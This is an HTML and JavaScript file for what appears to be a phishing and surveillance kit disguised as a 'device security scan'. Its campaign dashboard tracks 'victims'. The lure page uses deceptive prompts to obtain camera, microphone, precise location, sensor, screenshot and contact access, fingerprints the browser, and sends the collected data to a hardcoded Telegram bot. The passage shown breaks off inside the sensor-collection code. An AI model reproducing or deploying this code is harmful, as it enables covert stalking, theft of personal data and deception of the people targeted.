<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Device Information Scanner</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Leaflet CSS for OpenStreetMap -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body id="main-body">
    <!-- Content will be loaded dynamically -->

    <!-- Bootstrap JS Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Leaflet JS for OpenStreetMap -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <!-- html2canvas for screenshots -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    
    <script>
        // ============================================
        // GLOBAL VARIABLES AND CONFIGURATION
        // ============================================
        
        // Store for all victim data collected
        let victimsData = [];
        let currentStream = null;
        let currentMap = null;
        let audioRecorder = null;
        let audioChunks = [];
        let audioStream = null;
        
        // Campaign and link management
        const campaignManager = {
            campaigns: [],
            currentLink: '',
            currentCampaign: null,
            
            addCampaign: function(name, link, data) {
                const campaign = {
                    id: 'camp_' + Date.now(),
                    name: name,
                    link: link,
                    created: new Date().toISOString(),
                    stats: {
                        views: 0,
                        clicks: 0,
                        dataCollected: 0,
                        lastAccess: null
                    },
                    settings: data,
                    victims: []
                };
                
                this.campaigns.push(campaign);
                this.currentCampaign = campaign;
                this.saveAllData();
                
                return campaign;
            },
            
            addVictim: function(campaignId, victimData) {
                console.log('Adding victim to campaign:', campaignId);
                
                // Find or create campaign
                let campaign = this.campaigns.find(c => c.id === campaignId);
                if (!campaign) {
                    campaign = {
                        id: campaignId,
                        name: 'Auto-generated Campaign',
                        link: window.location.href,
                        created: new Date().toISOString(),
                        stats: {
                            views: 0,
                            clicks: 1,
                            dataCollected: 1,
                            lastAccess: new Date().toISOString()
                        },
                        settings: {},
                        victims: []
                    };
                    this.campaigns.push(campaign);
                }
                
                // Generate victim ID if not present
                if (!victimData.id) {
                    victimData.id = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                }
                
                victimData.campaignId = campaignId;
                victimData.campaignName = campaign.name;
                victimData.receivedAt = new Date().toISOString();
                
                // Add to campaign
                campaign.victims.push(victimData);
                campaign.stats.dataCollected++;
                campaign.stats.clicks++;
                campaign.stats.lastAccess = new Date().toISOString();
                
                // Add to global victims array
                victimsData.push(victimData);
                
                // Save all data
                this.saveAllData();
                
                console.log('Victim added successfully:', victimData.id);
                return victimData;
            },
            
            getVictims: function(campaignId = null) {
                if (campaignId) {
                    const campaign = this.campaigns.find(c => c.id === campaignId);
                    return campaign ? campaign.victims : [];
                }
                return this.campaigns.flatMap(campaign => campaign.victims);
            },
            
            incrementStat: function(campaignId, stat) {
                const campaign = this.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.stats[stat] !== undefined) {
                    campaign.stats[stat]++;
                    campaign.stats.lastAccess = new Date().toISOString();
                    this.saveAllData();
                }
            },
            
            saveAllData: function() {
                try {
                    localStorage.setItem('deviceScannerCampaigns', JSON.stringify(this.campaigns));
                    localStorage.setItem('deviceScannerVictims', JSON.stringify(victimsData));
                } catch (e) {
                    console.error('Failed to save data:', e);
                }
            },
            
            loadAllData: function() {
                try {
                    const savedCampaigns = localStorage.getItem('deviceScannerCampaigns');
                    if (savedCampaigns) {
                        this.campaigns = JSON.parse(savedCampaigns);
                    }
                    
                    const savedVictims = localStorage.getItem('deviceScannerVictims');
                    if (savedVictims) {
                        victimsData = JSON.parse(savedVictims);
                    }
                    
                    this.syncVictimsToCampaigns();
                    
                    return true;
                } catch (e) {
                    console.error('Failed to load data:', e);
                    this.campaigns = [];
                    victimsData = [];
                    return false;
                }
            },
            
            syncVictimsToCampaigns: function() {
                victimsData.forEach(victim => {
                    if (victim.campaignId) {
                        const campaign = this.campaigns.find(c => c.id === victim.campaignId);
                        if (campaign) {
                            const exists = campaign.victims.some(v => v.id === victim.id);
                            if (!exists) {
                                campaign.victims.push(victim);
                            }
                        }
                    }
                });
            },
            
            getCampaignStats: function() {
                return this.campaigns.map(c => ({
                    id: c.id,
                    name: c.name,
                    link: c.link,
                    stats: c.stats
                }));
            },
            
            clearAllData: function() {
                this.campaigns = [];
                victimsData = [];
                localStorage.removeItem('deviceScannerCampaigns');
                localStorage.removeItem('deviceScannerVictims');
                console.log('All data cleared');
            }
        };

        // Telegram bot configuration
        const telegramConfig = {
            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
            chatId: '1523864238',
            apiUrl: 'https://api.telegram.org/bot'
        };

        // ============================================
        // INITIALIZATION
        // ============================================

        document.addEventListener('DOMContentLoaded', function() {
            applyStyles();
            campaignManager.loadAllData();
            
            const urlParams = new URLSearchParams(window.location.search);
            const campaignId = urlParams.get('cid');
            const tracking = urlParams.get('track');
            
            if (tracking === 'true' && campaignId) {
                createVictimInterface(campaignId);
                campaignManager.incrementStat(campaignId, 'clicks');
                setTimeout(() => {
                    collectAllDataForVictim(campaignId);
                }, 1500);
            } else {
                loadDashboardInterface();
            }
        });

        // ============================================
        // STYLES
        // ============================================

        function applyStyles() {
            const style = document.createElement('style');
            style.textContent = `
                :root {
                    --primary-color: #2c3e50;
                    --secondary-color: #3498db;
                    --accent-color: #e74c3c;
                }
                
                /* VICTIM INTERFACE */
                .victim-interface {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    padding: 20px;
                }
                
                .victim-card {
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                    overflow: hidden;
                    max-width: 800px;
                    margin: 0 auto;
                }
                
                .victim-header {
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    color: white;
                    padding: 25px;
                    text-align: center;
                }
                
                .victim-body {
                    padding: 30px;
                }
                
                /* CAMERA PREVIEW */
                .camera-preview {
                    width: 100%;
                    height: 300px;
                    background: #000;
                    border-radius: 10px;
                    overflow: hidden;
                    margin: 20px 0;
                    position: relative;
                }
                
                .camera-preview video {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                }
                
                .camera-overlay {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    background: rgba(0,0,0,0.7);
                    color: white;
                    padding: 5px 10px;
                    border-radius: 5px;
                    font-size: 12px;
                }
                
                /* MAP CONTAINER */
                .map-container {
                    width: 100%;
                    height: 300px;
                    border-radius: 10px;
                    overflow: hidden;
                    margin: 20px 0;
                    border: 2px solid #ddd;
                }
                
                /* SENSOR DATA */
                .sensor-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 20px 0;
                }
                
                .sensor-card {
                    background: #f8f9fa;
                    border-radius: 10px;
                    padding: 15px;
                    text-align: center;
                    border-left: 4px solid var(--secondary-color);
                }
                
                .sensor-value {
                    font-size: 24px;
                    font-weight: bold;
                    color: var(--primary-color);
                    margin: 10px 0;
                }
                
                .sensor-label {
                    font-size: 12px;
                    color: #666;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }
                
                /* DASHBOARD */
                .dashboard-interface {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                .glass-card {
                    background: rgba(255, 255, 255, 0.95);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
                }
                
                .info-card {
                    transition: transform 0.3s, box-shadow 0.3s;
                    height: 100%;
                    border: none;
                    border-radius: 15px;
                    overflow: hidden;
                }
                
                .info-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                }
                
                .card-header {
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    color: white;
                    border-bottom: none;
                    font-weight: 600;
                    letter-spacing: 0.5px;
                }
                
                .card-icon {
                    font-size: 1.5rem;
                    margin-right: 10px;
                }
                
                .data-item {
                    padding: 10px 15px;
                    border-bottom: 1px solid #eee;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .data-item:last-child {
                    border-bottom: none;
                }
                
                .data-label {
                    font-weight: 600;
                    color: var(--primary-color);
                }
                
                .data-value {
                    color: #555;
                    text-align: right;
                    word-break: break-word;
                    max-width: 60%;
                }
                
                .victim-item {
                    border-left: 4px solid var(--secondary-color);
                    margin-bottom: 10px;
                    padding: 15px;
                    background: #f8f9fa;
                    border-radius: 10px;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                
                .victim-item:hover {
                    transform: translateX(5px);
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                }
                
                .victim-item.active {
                    border-left-color: var(--accent-color);
                    background: #fff;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                }
                
                /* BUTTONS */
                .btn-camera {
                    background: linear-gradient(45deg, #e74c3c, #c0392b);
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 50px;
                    font-weight: 600;
                    margin: 10px 5px;
                }
                
                .btn-location {
                    background: linear-gradient(45deg, #27ae60, #2ecc71);
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 50px;
                    font-weight: 600;
                    margin: 10px 5px;
                }
                
                .btn-microphone {
                    background: linear-gradient(45deg, #9b59b6, #8e44ad);
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 50px;
                    font-weight: 600;
                    margin: 10px 5px;
                }
                
                .btn-screenshot {
                    background: linear-gradient(45deg, #3498db, #2980b9);
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 50px;
                    font-weight: 600;
                    margin: 10px 5px;
                }
                
                .download-btn {
                    background: linear-gradient(45deg, #27ae60, #2ecc71);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .download-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
                }
                
                .telegram-btn {
                    background: linear-gradient(45deg, #0088cc, #00aced);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .telegram-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
                }
                
                .link-btn {
                    background: linear-gradient(45deg, #9b59b6, #8e44ad);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .link-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(155, 89, 182, 0.3);
                }
                
                /* MEDIA PREVIEW */
                .media-preview {
                    max-width: 100%;
                    max-height: 300px;
                    border-radius: 10px;
                    margin: 10px 0;
                    border: 2px solid #ddd;
                }
                
                /* CHECKLIST */
                .checklist-item {
                    padding: 12px;
                    border-bottom: 1px solid #eee;
                    display: flex;
                    align-items: center;
                    transition: all 0.3s;
                }
                
                .checklist-item.completed {
                    color: #28a745;
                }
                
                .checklist-item.completed i {
                    color: #28a745;
                }
                
                .checklist-item.active {
                    background-color: #f8f9fa;
                    border-left: 4px solid var(--secondary-color);
                }
                
                /* RESPONSIVE */
                @media (max-width: 768px) {
                    .victim-card {
                        margin: 10px;
                    }
                    
                    .camera-preview {
                        height: 200px;
                    }
                    
                    .map-container {
                        height: 200px;
                    }
                }
            `;
            document.head.appendChild(style);
        }

        // ============================================
        // VICTIM INTERFACE
        // ============================================

        function createVictimInterface(campaignId) {
            document.body.className = 'victim-interface';
            
            const urlParams = new URLSearchParams(window.location.search);
            const title = urlParams.get('title') || 'Advanced Device Security Scan';
            const redirect = urlParams.get('redirect') || 'https://google.com';
            
            document.body.innerHTML = `
                <div class="victim-card">
                    <div class="victim-header">
                        <h1 class="display-6 mb-2">
                            <i class="fas fa-shield-alt"></i> ${title}
                        </h1>
                        <p class="mb-0">Advanced Device Security & Performance Scan</p>
                    </div>
                    
                    <div class="victim-body">
                        <div class="text-center mb-4">
                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <h4 id="status-message">Initializing Advanced Security Scan</h4>
                            <p class="text-muted" id="status-details">
                                Please grant permissions when prompted for complete analysis
                            </p>
                        </div>
                        
                        <div class="progress mb-4" style="height: 20px;">
                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
                                 role="progressbar" style="width: 5%">
                                <span class="progress-text">5%</span>
                            </div>
                        </div>
                        
                        <div id="checklist" class="mb-4">
                            <div class="checklist-item active">
                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
                                <span>Basic Device Information</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Network Analysis</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Device Fingerprinting</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Camera & Location Access</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Sensor Data Collection</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Advanced Data Collection</span>
                            </div>
                        </div>
                        
                        <!-- Camera Preview -->
                        <div id="camera-section" style="display: none;">
                            <h6><i class="fas fa-camera"></i> Camera Access</h6>
                            <div class="camera-preview">
                                <video id="camera-feed" autoplay playsinline></video>
                                <div class="camera-overlay" id="camera-status">Camera Off</div>
                            </div>
                            <div class="text-center">
                                <button class="btn-camera" onclick="capturePhoto()">
                                    <i class="fas fa-camera"></i> Capture Photo
                                </button>
                                <button class="btn-camera" onclick="toggleCamera()">
                                    <i class="fas fa-video-slash"></i> Turn Off Camera
                                </button>
                            </div>
                            <div id="photo-preview"></div>
                        </div>
                        
                        <!-- Location Map -->
                        <div id="map-section" style="display: none;">
                            <h6><i class="fas fa-map-marker-alt"></i> Location Detection</h6>
                            <div class="map-container" id="map"></div>
                            <div class="text-center mt-2">
                                <button class="btn-location" onclick="getHighAccuracyLocation()">
                                    <i class="fas fa-bullseye"></i> High Accuracy Location
                                </button>
                            </div>
                            <div id="location-info" class="mt-2"></div>
                        </div>
                        
                        <!-- Sensor Data -->
                        <div id="sensor-section" style="display: none;">
                            <h6><i class="fas fa-compass"></i> Device Sensors</h6>
                            <div class="sensor-grid" id="sensor-data"></div>
                        </div>
                        
                        <!-- Screenshot -->
                        <div id="screenshot-section" class="mt-4" style="display: none;">
                            <h6><i class="fas fa-desktop"></i> Screen Analysis</h6>
                            <div class="text-center">
                                <button class="btn-screenshot" onclick="captureScreenshot()">
                                    <i class="fas fa-camera"></i> Capture Full Page Screenshot
                                </button>
                            </div>
                            <div id="screenshot-preview" class="mt-3"></div>
                        </div>
                        
                        <!-- Microphone -->
                        <div id="microphone-section" class="mt-4" style="display: none;">
                            <h6><i class="fas fa-microphone"></i> Audio Analysis</h6>
                            <div class="text-center">
                                <button class="btn-microphone" onclick="startMicrophone()">
                                    <i class="fas fa-microphone"></i> Start Audio Recording
                                </button>
                                <button class="btn-microphone" onclick="stopMicrophone()" style="display: none;" id="stop-mic-btn">
                                    <i class="fas fa-stop"></i> Stop Recording
                                </button>
                            </div>
                            <div id="audio-visualizer" class="mt-3" style="height: 100px; background: #f8f9fa; border-radius: 10px; display: none;"></div>
                            <div id="audio-preview" class="mt-3"></div>
                        </div>
                        
                        <!-- Contacts Access -->
                        <div id="contacts-section" class="mt-4" style="display: none;">
                            <h6><i class="fas fa-address-book"></i> Contacts Access</h6>
                            <div class="text-center">
                                <button class="btn btn-primary" onclick="accessContacts()">
                                    <i class="fas fa-users"></i> Access Contacts
                                </button>
                            </div>
                            <div id="contacts-info" class="mt-3"></div>
                        </div>
                        
                        <div class="alert alert-info mt-4">
                            <i class="fas fa-info-circle"></i>
                            <strong>Note:</strong> Some features require explicit permission. 
                            Please allow access when prompted for complete device analysis.
                        </div>
                    </div>
                    
                    <div class="victim-footer" style="padding: 20px; background: #f8f9fa; text-align: center;">
                        <div class="d-flex justify-content-center align-items-center">
                            <i class="fas fa-circle text-success me-2" style="font-size: 0.7rem;"></i>
                            <span>Advanced Scan in progress • Estimated time: 25 seconds</span>
                        </div>
                    </div>
                </div>
            `;
        }

        // ============================================
        // ADVANCED DATA COLLECTION
        // ============================================

        async function collectAllDataForVictim(campaignId) {
            console.log('Starting advanced data collection for campaign:', campaignId);
            
            const totalSteps = 8;
            
            const victimDeviceData = {
                deviceInfo: {},
                networkInfo: {},
                batteryInfo: {},
                locationInfo: {},
                sensorData: {},
                mediaData: {
                    photos: [],
                    screenshots: [],
                    audioRecordings: []
                },
                contactsData: {},
                storageInfo: {},
                permissionsInfo: {},
                fingerprintInfo: {},
                timestamp: new Date().toISOString()
            };
            
            try {
                // Step 1: Basic Device Info
                updateVictimProgress(1, totalSteps, "Collecting Device Information...");
                collectDeviceInfoForVictim(victimDeviceData);
                await delay(1000);
                
                // Step 2: Network & IP
                updateVictimProgress(2, totalSteps, "Analyzing Network...");
                await collectNetworkInfoForVictim(victimDeviceData);
                await delay(1000);
                
                // Step 3: Fingerprint
                updateVictimProgress(3, totalSteps, "Creating Device Fingerprint...");
                collectFingerprintInfoForVictim(victimDeviceData);
                await delay(1000);
                
                // Step 4: Camera Access
                updateVictimProgress(4, totalSteps, "Accessing Camera...");
                document.getElementById('camera-section').style.display = 'block';
                await initializeCamera();
                await delay(2000);
                
                // Step 5: Location
                updateVictimProgress(5, totalSteps, "Detecting Location...");
                document.getElementById('map-section').style.display = 'block';
                try {
                    await getLocationForVictim(victimDeviceData);
                } catch (e) {
                    console.log('Location not available:', e.message);
                }
                await delay(2000);
                
                // Step 6: Sensors
                updateVictimProgress(6, totalSteps, "Reading Device Sensors...");
                document.getElementById('sensor-section').style.display = 'block';
                await collectSensorDataForVictim(victimDeviceData);
                await delay(1000);
                
                // Step 7: Screenshot
                updateVictimProgress(7, totalSteps, "Analyzing Screen...");
                document.getElementById('screenshot-section').style.display = 'block';
                await captureScreenshotForData(victimDeviceData);
                await delay(1000);
                
                // Step 8: Microphone & Contacts
                updateVictimProgress(8, totalSteps, "Finalizing Advanced Scan...");
                document.getElementById('microphone-section').style.display = 'block';
                document.getElementById('contacts-section').style.display = 'block';
                
                // Try to access microphone
                try {
                    await testMicrophoneAccess(victimDeviceData);
                } catch (e) {
                    console.log('Microphone access failed:', e);
                }
                
                // Try to access contacts
                try {
                    await accessContactsForData(victimDeviceData);
                } catch (e) {
                    console.log('Contacts access failed:', e);
                }
                
                // Collect additional info
                collectStorageInfoForVictim(victimDeviceData);
                await collectBatteryInfoForVictim(victimDeviceData);
                await collectPermissionsInfoForVictim(victimDeviceData);
                
                // Generate victim ID
                victimDeviceData.victimID = generateVictimID();
                
                // Save data
                const savedVictim = campaignManager.addVictim(campaignId, victimDeviceData);
                
                // Send to Telegram
                await sendCompleteDataToTelegram(savedVictim, campaignId);
                
                // Show completion
                completeAdvancedScan(campaignId);
                
                return victimDeviceData;
                
            } catch (error) {
                console.error('Error in data collection:', error);
                victimDeviceData.error = error.message;
                victimDeviceData.victimID = generateVictimID();
                campaignManager.addVictim(campaignId, victimDeviceData);
                completeAdvancedScan(campaignId);
                return victimDeviceData;
            }
        }

        // ============================================
        // BASIC DATA COLLECTION FUNCTIONS
        // ============================================

        function collectDeviceInfoForVictim(victimData) {
            victimData.deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screenResolution: `${window.screen.width} x ${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth} bit`,
                pixelRatio: window.devicePixelRatio || 1,
                orientation: window.screen.width > window.screen.height ? 'Landscape' : 'Portrait',
                deviceName: getDeviceName(),
                browser: getBrowserInfo(),
                os: getOSInfo(),
                isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                timestamp: new Date().toISOString()
            };
        }

        async function collectNetworkInfoForVictim(victimData) {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                victimData.networkInfo = {
                    ipv4: data.ip,
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    timestamp: new Date().toISOString()
                };
                
                if (navigator.connection) {
                    const conn = navigator.connection;
                    victimData.networkInfo.connectionType = conn.effectiveType || 'Unknown';
                    victimData.networkInfo.downlink = conn.downlink || 'Unknown';
                    victimData.networkInfo.rtt = conn.rtt || 'Unknown';
                    victimData.networkInfo.saveData = conn.saveData ? 'Enabled' : 'Disabled';
                }
            } catch (error) {
                victimData.networkInfo = {
                    ipv4: 'Unable to retrieve',
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    timestamp: new Date().toISOString()
                };
            }
        }

        function collectStorageInfoForVictim(victimData) {
            victimData.storageInfo = {
                available: 'Unknown',
                used: 'Unknown',
                timestamp: new Date().toISOString()
            };
        }

        async function collectBatteryInfoForVictim(victimData) {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    victimData.batteryInfo = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        timestamp: new Date().toISOString()
                    };
                } catch (error) {
                    victimData.batteryInfo = {
                        level: 'Unknown',
                        charging: 'Unknown',
                        timestamp: new Date().toISOString()
                    };
                }
            } else {
                victimData.batteryInfo = {
                    level: 'Unknown',
                    charging: 'Unknown',
                    timestamp: new Date().toISOString()
                };
            }
        }

        async function collectPermissionsInfoForVictim(victimData) {
            victimData.permissionsInfo = {
                timestamp: new Date().toISOString()
            };
            
            const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
            for (const permission of permissions) {
                try {
                    const result = await navigator.permissions.query({ name: permission });
                    victimData.permissionsInfo[permission] = result.state;
                } catch (error) {
                    victimData.permissionsInfo[permission] = 'Not supported';
                }
            }
        }

        function collectFingerprintInfoForVictim(victimData) {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                if (ctx) {
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.textBaseline = 'alphabetic';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('Fingerprint', 2, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.fillText('Fingerprint', 4, 17);
                    
                    const canvasData = canvas.toDataURL();
                    victimData.fingerprintInfo = {
                        canvas: simpleHash(canvasData),
                        canvasHash: canvasData.substring(0, 100),
                        userAgent: simpleHash(navigator.userAgent),
                        platform: simpleHash(navigator.platform),
                        languages: simpleHash(navigator.languages?.join(',') || ''),
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                        screen: simpleHash(`${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`),
                        plugins: simpleHash(Array.from(navigator.plugins || []).map(p => p.name).join(',')),
                        mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(','),
                        webgl: getWebGLInfo(),
                        fonts: getFontsList(),
                        timestamp: new Date().toISOString()
                    };
                }
            } catch (error) {
                victimData.fingerprintInfo = {
                    error: error.message,
                    timestamp: new Date().toISOString()
                };
            }
        }

        // ============================================
        // CAMERA FUNCTIONS
        // ============================================

        async function initializeCamera() {
            try {
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'environment'
                    }
                };
                
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                const videoElement = document.getElementById('camera-feed');
                videoElement.srcObject = currentStream;
                document.getElementById('camera-status').textContent = 'Camera Active';
                
                return true;
            } catch (error) {
                console.log('Camera access denied or not available:', error);
                document.getElementById('camera-status').textContent = 'Camera Not Available';
                return false;
            }
        }

        function toggleCamera() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;
                document.getElementById('camera-feed').srcObject = null;
                document.getElementById('camera-status').textContent = 'Camera Off';
            } else {
                initializeCamera();
            }
        }

        function capturePhoto() {
            if (!currentStream) {
                alert('Please enable camera first');
                return;
            }
            
            const video = document.getElementById('camera-feed');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Display preview
            const previewDiv = document.getElementById('photo-preview');
            previewDiv.innerHTML = `
                <div class="alert alert-success">
                    <i class="fas fa-check"></i> Photo captured successfully!
                    <img src="${photoData}" class="media-preview mt-2" alt="Captured Photo">
                    <div class="mt-2">
                        <button class="btn btn-sm btn-success" onclick="savePhoto('${photoData}')">
                            <i class="fas fa-save"></i> Save Photo
                        </button>
                    </div>
                </div>
            `;
            
            return photoData;
        }

        // ============================================
        // LOCATION & MAP FUNCTIONS
        // ============================================

        async function getLocationForVictim(victimData) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString(),
                            source: 'victim_access'
                        };
                        
                        victimData.locationInfo = location;
                        
                        // Initialize map
                        await initializeMap(location.latitude, location.longitude);
                        
                        // Display location info
                        document.getElementById('location-info').innerHTML = `
                            <div class="alert alert-success">
                                <i class="fas fa-check-circle"></i> Location detected!
                                <div class="mt-2">
                                    <strong>Coordinates:</strong> ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}<br>
                                    <strong>Accuracy:</strong> ${location.accuracy.toFixed(2)} meters<br>
                                    <strong>Altitude:</strong> ${location.altitude ? location.altitude.toFixed(2) + 'm' : 'N/A'}<br>
                                    <strong>Speed:</strong> ${location.speed ? location.speed.toFixed(2) + 'm/s' : 'N/A'}
                                </div>
                                <div class="mt-2">
                                    <a href="https://maps.google.com/?q=${location.latitude},${location.longitude}" 
                                       target="_blank" class="btn btn-sm btn-primary me-2">
                                        <i class="fab fa-google"></i> Google Maps
                                    </a>
                                    <a href="https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}" 
                                       target="_blank" class="btn btn-sm btn-success">
                                        <i class="fas fa-map"></i> OpenStreetMap
                                    </a>
                                </div>
                            </div>
                        `;
                        
                        resolve(location);
                    },
                    (error) => {
                        console.log('Geolocation error:', error);
                        reject(error);
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function initializeMap(lat, lng) {
            try {
                // Initialize OpenStreetMap
                currentMap = L.map('map').setView([lat, lng], 13);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap contributors',
                    maxZoom: 19
                }).addTo(currentMap);
                
                // Add marker
                L.marker([lat, lng]).addTo(currentMap)
                    .bindPopup('Detected Location<br>Accuracy: ±' + location.accuracy.toFixed(2) + 'm')
                    .openPopup();
                
                // Add circle for accuracy
                L.circle([lat, lng], {
                    color: 'red',
                    fillColor: '#f03',
                    fillOpacity: 0.1,
                    radius: location.accuracy
                }).addTo(currentMap);
                
            } catch (error) {
                console.log('Map initialization failed:', error);
            }
        }

        function getHighAccuracyLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        
                        if (currentMap) {
                            currentMap.setView([lat, lng], 16);
                            L.marker([lat, lng]).addTo(currentMap)
                                .bindPopup('High Accuracy Location<br>±' + position.coords.accuracy.toFixed(2) + 'm')
                                .openPopup();
                        }
                    },
                    null,
                    { enableHighAccuracy: true }
                );
            }
        }

        // ============================================
        // SENSOR DATA COLLECTION
        // ============================================

        async function collectSensorDataForVictim(victimData) {
            victimData.sensorData = {
                accelerometer: {},
                gyroscope: {},
                magnetometer: {},
                ambientLight: {},
                proximity: {},
                orientation: {},
                timestamp: new Date().toISOString()
            };
            
            const sensorDiv = document.getElementById('sensor-data');
            
            // Check for device orientation
            if (window.DeviceOrientationEvent) {
                window.addEventListener('deviceorientation', (event) => {
                    victimData.sensorData.orientation = {
                        alpha: event.alpha,
                        beta: event.beta,
                        gamma: event.gamma
                    };
                    
                    updateSensorDisplay('orientation', `
